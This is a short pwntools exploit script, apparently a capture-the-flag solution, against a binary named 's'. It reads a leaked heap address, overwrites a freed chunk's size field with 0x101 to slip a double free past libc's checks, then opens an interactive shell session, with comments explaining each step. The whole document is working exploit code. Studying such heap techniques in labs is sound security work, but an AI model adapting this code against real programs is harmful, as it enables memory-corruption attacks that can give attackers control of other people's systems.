#!/usr/bin/env python3
from pwn import *

e = ELF("s")

context.binary = e

def conn():
	if args.REMOTE:
		return remote("addr", 1337)
	elif args.GDB:
		return gdb.debug(e.path, "c")
	else:
		return process(e.path)

if __name__ == '__main__':
	r = conn()
	chunk = int(r.recvlineS(keepends=False)[2:], 16)
	# before char *d = malloc(64), we had char *c = malloc(64), so c should be 64 + 16 (chunk metadata) = 0x50 below d in mem
	# change the size of the chunk after free, which is 8 bytes before the chunk's address
	# that way, when free is called for a second time, even though the chunk has been freed already, it's in a different linked list
	# and libc doesn't check that
	r.sendline(str(chunk-0x50-8).encode())
	# anything that doesn't say that the chunk has size 0x50
	r.sendline(str(0x101).encode())
	r.interactive()